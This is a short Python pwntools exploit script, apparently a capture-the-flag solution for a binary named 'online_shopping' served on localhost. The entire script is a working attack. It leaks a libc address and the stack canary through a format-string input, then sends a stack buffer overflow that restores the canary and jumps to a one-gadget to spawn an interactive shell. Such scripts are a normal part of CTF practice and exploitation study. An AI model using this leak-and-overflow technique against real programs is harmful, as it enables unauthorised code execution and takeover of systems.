from pwn import *
import sys
# r = process('../online_shopping/share/online_shopping')
r = remote('127.0.0.1', 10011)
r.sendlineafter('e: ', '1')
r.sendlineafter('buy? ', '1')
r.sendlineafter('buy? ', '1')
r.sendlineafter('ss: ', '%3$p-%9$p')
cnt = r.recvuntil('\n', drop=True)
cnt = cnt.split(b'-')
libc = int(cnt[0], 16) - 0x21aaa0
log.success('libc = ' + hex(libc))
canary = int(cnt[1], 16)
log.success('canary = ' + hex(canary))
og = libc + 0xebd3f
payload2 = b'A' * 0x18 + p64(canary) + p64(libc + 0x21be00) + p64(og)
r.sendlineafter('club: ', payload2)
r.interactive()
